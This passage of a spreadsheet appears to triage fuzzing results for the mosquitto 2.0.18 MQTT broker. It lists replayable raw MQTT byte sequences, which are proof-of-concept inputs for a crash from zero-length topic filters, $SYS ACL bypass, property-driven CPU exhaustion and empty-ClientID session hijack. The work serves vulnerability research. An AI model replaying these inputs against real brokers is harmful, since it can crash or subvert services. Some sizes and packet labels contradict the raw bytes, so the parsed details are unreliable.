        <f>== 种子标识: id:000006,sev:4,cat:0042 ===\u000a大小: 664B (报告+请求数据)\u000a请求数据: 141B\u000a\u000a---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MQTT请求序列(141B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=877 Topics=[''(零长度!QoS=1)] | raw_header=820f036d000009612f622f632f642f65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=83B | raw_header=3472001d245359532f62726f6b65722f\u000aMsg[3]: SUBSCRIBE  | raw_header=8a0100\u000aMsg[4]: SUBSCRIBE  | raw_header=8000\u000aMsg[5]: (不完整,3B) raw=807374\u000a(尾部3B): 807374</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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1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11">
      <c r="A611" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000006,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B611" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C611" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(44B)\u000a4.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11" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c0 ===\u000a大小: 607B (报告+请求数据)\u000a请求数据: 44B\u000a\u000a---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MQTT请求序列(44B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=74 Topics=['#'(QoS=1), ''(零长度!QoS=0)] | raw_header=8209004a00012301000000\u000aMsg[2]: PUBLISH Topic='test/topic' QoS=1 retain=True payload='\x00K\x8aÄ\x92R_L²ífä³ì\x9f\x99\x0f' | raw_header=331d000a746573742f746f706963004b\u000aMsg[3]: (不完整,2B) raw=aa10\u000a(尾部2B): aa10</f>
        <v/>
      </c>
      <c r="F6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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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1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2">
      <c r="A612" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000006,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B612" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C612" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(105B)\u000a4.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12" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c2 ===\u000a大小: 815B (报告+请求数据)\u000a请求数据: 105B\u000a\u000a---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MQTT请求序列(105B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=ff00\u000aMsg[2]: SUBSCRIBE PacketID=65 Topics=['a/b/c/d/e'(QoS=1), ''(零长度!QoS=2)] | raw_header=821100410009612f622f632f642f6501\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=47B | raw_header=334e001d245359532f62726f6b65722f\u000aMsg[4]: (不完整,4B) raw=01ffa418\u000a(尾部4B): 01ffa418</f>
        <v/>
      </c>
      <c r="F6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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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1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13">
      <c r="A613" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000006,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B613" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C613" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(195B)\u000a4.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613" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0244 ===\u000a大小: 900B (报告+请求数据)\u000a请求数据: 195B\u000a\u000a---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MQTT请求序列(195B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[''(零长度!QoS=0)] | raw_header=820b0004000000001361666c62\u000aMsg[2]: PUBREL  | raw_header=6500\u000aMsg[3]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1361666c6265745f6330820b00010006\u000aMsg[4]: CONNACK  | raw_header=2300\u000aMsg[5]: PUBLISH Topic='test/t' QoS=2 retain=False payload='opic\x00\x08hello' | raw_header=34130006746573742f746f7069630008\u000aMsg[6]: PUBREC PacketID=240 | raw_header=500200f0\u000aMsg[7]: PUBLISH  | raw_header=3600\u000aMsg[8]: PUBLISH Topic='exterc\x00:' QoS=2 retain=False payload='%\x01¢\x02&gt;øë_\x08\x00\x01' | raw_header=34150008657874657263003a2501a202\u000aMsg[9]: PUBCOMP PacketID=18 | raw_header=74090012be37ff97dc249e\u000aMsg[10]: (不完整,18B) raw=f3b0868a0210428797c65982828220828282\u000a(尾部18B): f3b0868a0210428797c65982828220828282</f>
        <v/>
      </c>
      <c r="F6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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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1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4">
      <c r="A614" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B614" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C614" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(596B)\u000a4.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14" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0002 ===\u000a大小: 926B (报告+请求数据)\u000a请求数据: 596B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(596B原始二进制) ---\u000aMsg[1]: (不完整,596B) raw=3cdf1c01806c6861e3f730a1790d7301ef4c1045ba890df05b10a1c00bf0f6b310fc7df2a21b6d43\u000a(尾部596B): 3cdf1c01806c6861e3f730a1790d7301ef4c1045ba890df05b10a1c00bf0f6b310fc7df2a21b6d437be00174001324535953</f>
        <v/>
      </c>
      <c r="F6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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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15">
      <c r="A615" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B615" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C615" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(156B)\u000a4.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15" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0082 ===\u000a大小: 673B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MQTT请求序列(156B原始二进制) ---\u000aMsg[1]: PINGRESP  | raw_header=d800\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e87465737d2f0001322f23040601320f\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload='&amp;\x00\x0bsensorl' | raw_header=311f0013245359532f62726f6b65722f\u000aMsg[4]: (不完整,3B) raw=64e000\u000a(尾部3B): 64e000</f>
        <v/>
      </c>
      <c r="F6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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J61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1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16">
      <c r="A616" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B616" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C616" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000007,sev:3,cat:00c0)中的REQUEST DATA提取出来(257B)\u000a4.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16" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:00c0 ===\u000a大小: 627B (报告+请求数据)\u000a请求数据: 257B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(257B原始二进制) ---\u000aMsg[1]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626a626262626267f0026\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: (不完整,177B) raw=26823a05291a2600142473686172652f677270322f73656e736f722f230001740001742800012328\u000a(尾部177B): 26823a05291a2600142473686172652f677270322f73656e736f722f2300017400017428000123280012686f6d652f2b2f74</f>
        <v/>
      </c>
      <c r="F6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1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16" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J61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1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17">
      <c r="A617" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B617" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C617" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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17" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0101 ===\u000a大小: 438B (报告+请求数据)\u000a请求数据: 64B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(64B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=29643 Topics=[] | raw_header=8a0673cb7f800010\u000aMsg[2]: PUBCOMP PacketID=18477 | raw_header=7003482d87\u000aMsg[3]: SUBSCRIBE  | raw_header=8000\u000aMsg[4]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10a200000000000000000000e9ffffff\u000aMsg[5]: TYPE0  | raw_header=0000\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: TYPE0  | raw_header=0000\u000aMsg[8]: TYPE0  | raw_header=0000\u000aMsg[9]: (不完整,4B) raw=00808113\u000a(尾部4B): 00808113</f>
        <v/>
      </c>
      <c r="F6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1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17" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J61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1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18">
      <c r="A618" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B618" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C618" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(201B)\u000a4.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18" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0040 ===\u000a大小: 610B (报告+请求数据)\u000a请求数据: 201B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(201B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=281 Topics=[''(零长度!QoS=2)] | raw_header=82310119000012686f6d652f2b2f7465\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=0 retain=False payload_len=133B | raw_header=389201000b73656e736f722f74656d70\u000aMsg[3]: CONNACK  | raw_header=20</f>
        <v/>
      </c>
      <c r="F6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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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1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19">
      <c r="A619" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B619" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C619" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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19" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c0 ===\u000a大小: 784B (报告+请求数据)\u000a请求数据: 188B\u000a\u000a---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MQTT请求序列(188B原始二进制) ---\u000aMsg[1]: PINGRESP  | raw_header=da00\u000aMsg[2]: SUBSCRIBE PacketID=230 Topics=[''(零长度!QoS=1)] | raw_header=823e00e6000001740e00062b2f646174\u000aMsg[3]: PUBLISH Topic='sensor/temp' QoS=0 retain=True payload_len=107B | raw_header=3978000b73656e736f722f74656d703b</f>
        <v/>
      </c>
      <c r="F6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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J61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1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20">
      <c r="A620" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B620" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C620" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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20" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c2 ===\u000a大小: 896B (报告+请求数据)\u000a请求数据: 186B\u000a\u000a---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MQTT请求序列(186B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=33592 Topics=[] | raw_header=820b833825000000dde5b47526\u000aMsg[2]: SUBSCRIBE PacketID=1119 Topics=[''(零长度!QoS=1)] | raw_header=8223045f0000017402000d2473686172\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=101B | raw_header=317a0013245359532f62726f6b65722f\u000aMsg[4]: (不完整,12B) raw=00747474696350746f706963\u000a(尾部12B): 00747474696350746f706963</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J62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21">
      <c r="A621" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B621" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C621" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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621" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0244 ===\u000a大小: 712B (报告+请求数据)\u000a请求数据: 167B\u000a\u000a---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MQTT请求序列(167B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$share/grp1/#' QoS=2 retain=False payload='\x01\x0bV¢}*°ðú\u00ad®\x9e' | raw_header=3c1b000d2473686172652f677270312f\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e61434130006746573742f746f706980\u000aMsg[3]: PUBLISH  | raw_header=3c00\u000aMsg[4]: TYPE0  | raw_header=0d00\u000aMsg[5]: SUBSCRIBE PacketID=13 Topics=[''(零长度!QoS=0)] | raw_header=8205000d000000\u000aMsg[6]: (不完整,105B) raw=0674657365b02300328217013300122473f76172652f477270312f746573742f2b003538001c2480\u000a(尾部105B): 0674657365b02300328217013300122473f76172652f477270312f746573742f2b003538001c2480686172652f67332f686f</f>
        <v/>
      </c>
      <c r="F6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21" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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2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22">
      <c r="A622" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B622" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C622" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(158B)\u000a4.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22" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c4 ===\u000a大小: 890B (报告+请求数据)\u000a请求数据: 158B\u000a\u000a---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MQTT请求序列(158B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$share/grp1/#' QoS=2 retain=False payload='\x01\x0bv¢}*°ðú\u00ad®\x9e' | raw_header=3c1b000d2473686172652f677270312f\u000aMsg[2]: TYPE0  | raw_header=0400\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=1)] | raw_header=82200001000001741800122473686172\u000aMsg[4]: PUBLISH Topic='t' QoS=0 retain=True payload_len=54B | raw_header=39390001742b019b0245fe926408001d\u000aMsg[5]: PUBLISH Topic='test/t' QoS=2 retain=False payload='o/b\x00\x03èorld¢' | raw_header=34130006746573742f746f2f620003e8\u000aMsg[6]: TYPE0  | raw_header=0a00\u000aMsg[7]: (不完整,11B) raw=0be006746573742f23e000\u000a(尾部11B): 0be006746573742f23e000</f>
        <v/>
      </c>
      <c r="F6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22" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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2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23">
      <c r="A623" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000007,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B623" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C623" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(424B)\u000a4.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0x02c6\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E623" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c6 ===\u000a大小: 1807B (报告+请求数据)\u000a请求数据: 424B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: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MQTT请求序列(424B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=33336 Topics=[] | raw_header=820b823800641e0bdd64007526\u000aMsg[2]: TYPE0  | raw_header=000a74963c210f64221d9d19\u000aMsg[3]: TYPE0  | raw_header=000966757a7a5f75736572\u000aMsg[4]: TYPE0  | raw_header=000966757a7a5f70617373\u000aMsg[5]: SUBSCRIBE PacketID=32915 Topics=[''(零长度!QoS=1)] | raw_header=822280930000012312000a746573742f\u000aMsg[6]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=42B | raw_header=3449001d245359532f62726f6b65722f\u000aMsg[7]: TYPE0  | raw_header=000966757a7a5f75736572\u000aMsg[8]: TYPE0  | raw_header=000966757a7a5f70617373\u000aMsg[9]: SUBSCRIBE PacketID=32915 Topics=[''(零长度!QoS=1)] | raw_header=822280930000012312000a746573742f\u000aMsg[10]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=42B | raw_header=3449001d245359532f62726f6b65722f\u000aMsg[11]: DISCONNECT 断开连接 | raw_header=e01998171f0014247368618217000700\u000aMsg[12]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=312f746573742f2b01354f0012247368\u000aMsg[13]: (不完整,57B) raw=cc576be08377d1af1988f0d65bf18f5ed95ed867d6a026db65307f606ea2833bf9ee1b7d65ec2c7e\u000a(尾部57B): cc576be08377d1af1988f0d65bf18f5ed95ed867d6a026db65307f606ea2833bf9ee1b7d65ec2c7e7572652f677270322f73</f>
        <v/>
      </c>
      <c r="F6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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J62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24">
      <c r="A624" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B624" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C624" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(169B)\u000a4.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24" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0002 ===\u000a大小: 848B (报告+请求数据)\u000a请求数据: 169B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(169B原始二进制) ---\u000aMsg[1]: (不完整,169B) raw=34823a004d0000020012686f6d652f2b2f74656d706572617475726502001d245359532f62726f6b\u000a(尾部169B): 34823a004d0000020012686f6d652f2b2f74656d706572617475726502001d245359532f62726f6b65722f636c69656e7473</f>
        <v/>
      </c>
      <c r="F6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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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25">
      <c r="A625" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B625" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C625" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(5950B)\u000a4.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25" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0082 ===\u000a大小: 4617B (报告+请求数据)\u000a请求数据: 5950B\u000a\u000a---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MQTT请求序列(5950B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$SYS/broker/clients/connec$sh' QoS=0 retain=False payload_len=49B | raw_header=3050001d245359532f62726f6b65722f\u000aMsg[2]: PUBREL PacketID=28722 | raw_header=677270322f73656e736f722f2f686f6d\u000aMsg[3]: (不完整,3944B) raw=3ab323cf160bc39b7261747572653f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000a(尾部3944B): 3ab323cf160bc39b7261747572653f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f</f>
        <v/>
      </c>
      <c r="F6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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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26">
      <c r="A626" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B626" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C626" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(1318B)\u000a4.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26" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c0 ===\u000a大小: 1721B (报告+请求数据)\u000a请求数据: 1318B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(1318B原始二进制) ---\u000aMsg[1]: CONNECT  | raw_header=1000\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626ef06260c2626262626262626\u000aMsg[3]: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raw_header=26262626262626262630262626262626\u000aMsg[22]: CONNACK session_present=166 reason_code=38 | raw_header=2626a626262626262626262626262626\u000aMsg[23]: CONNACK session_present=38 reason_code=38 | raw_header=26182626262626132626262626262626\u000aMsg[24]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[25]: CONNACK session_present=38 reason_code=38 | raw_header=2626262626262626262626ce26262626\u000a(尾部370B): 6e65745f6330d2278231dd1818c818f13a938266757a7a5f6333820b00010006742626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F6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2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26" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J62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2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27">
      <c r="A627" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B627" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C627" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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27" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0101 ===\u000a大小: 749B (报告+请求数据)\u000a请求数据: 50B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(50B原始二进制) ---\u000aMsg[1]: CONNECT Proto=M\x00\x00T v4 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=101500044d00005404f8003c00000100\u000aMsg[2]: (不完整,27B) raw=745f742f6e745f3031e000820b00010006ff8073742f230300e000\u000a(尾部27B): 745f742f6e745f3031e000820b00010006ff8073742f230300e000</f>
        <v/>
      </c>
      <c r="F6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2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27" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J62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2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28">
      <c r="A628" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000008,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B628" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C628" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(1419B)\u000a4.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Sev3\u000a- 违规类别代码: 0x0206\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E628" s="2">
